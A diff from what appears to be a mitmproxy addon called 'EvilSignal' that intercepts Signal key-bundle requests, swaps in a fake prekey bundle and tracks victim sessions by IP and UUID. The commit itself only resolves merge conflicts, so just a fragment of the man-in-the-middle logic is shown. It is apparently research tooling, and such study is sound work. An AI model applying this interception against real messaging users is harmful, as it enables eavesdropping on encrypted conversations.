@@ -120,7 +120,6 @@ f.close()
 
 api = addons[0]
 
-<<<<<<< HEAD
 class EvilSignal(InterceptedAPI):
     wrapped_api = None
 
@@ -174,14 +173,6 @@ class EvilSignal(InterceptedAPI):
         super().load(loader) # pass remaining to
 
 api = EvilSignal(api)
-=======
-# ctx.options.add_option(
-#     name="conversation_session",
-#     typespec=dict,
-#     default=dict(),
-#     help="chat sessions",
-# )
->>>>>>> b3b0986 (Message received but invalid Kyber prekey identifier received)
 
 def json_to_reginfo(json_registations: str) -> dict[str, RegistrationInfo]:
     loaded_dict = json.loads(json_registations)
@@ -557,14 +548,11 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     resp.update(fakeBundle_wire)
 
-<<<<<<< HEAD
     # ctx.options.conversation_session[] = (fakeVictim, fakeUser)
-    ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
-    logging.warning(f"session {ctx.options.conversation_session}")
-=======
+    #ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
+    # logging.warning(f"session {ctx.options.conversation_session}")
     conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
-    logging.warning(f"session {conversation_session}")
->>>>>>> b3b0986 (Message received but invalid Kyber prekey identifier received)
+    # logging.warning(f"session {conversation_session}")
 
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
     assert "privateKey" not in resp['devices'][0]['signedPreKey']
